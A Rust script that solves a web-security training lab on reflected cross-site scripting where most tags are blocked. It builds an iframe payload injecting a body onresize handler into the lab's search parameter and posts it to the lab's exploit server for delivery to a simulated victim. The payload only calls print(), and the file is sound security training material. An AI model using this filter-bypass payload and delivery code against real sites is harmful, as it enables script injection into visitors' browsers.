/*******************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 21/11/2023
*
* Lab: Reflected XSS into HTML context with most tags and attributes blocked
*
* Steps: 1. Craft an iframe that, when loaded, will change the body width, causing the 
*           onresize event handler to be invoked
*        2. Deliver the exploit to the victim
*        3. The print() function will be called after they trigger the exploit
*
********************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0a02000b04e2d4618122b66f00020010.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0aac004c040bd492819cb502019700fb.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // the header of your exploit sever response
    let exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";

    // payload to call the print() function
    let payload = format!(
        r###"<iframe src="{lab_url}/?search=<body onresize=print()>" onload=this.style.width='100px'>"###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ".white(),);
    io::stdout().flush();

    // deliver the exploit to the victim
    client
        .post(exploit_server_url)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", exploit_server_head),
            ("responseBody", &payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to deliver the exploit to the victim".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 The print() function will be called after they trigger the exploit".white()
    );
    println!(
        "{} {}",
        "🗹 The lab should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}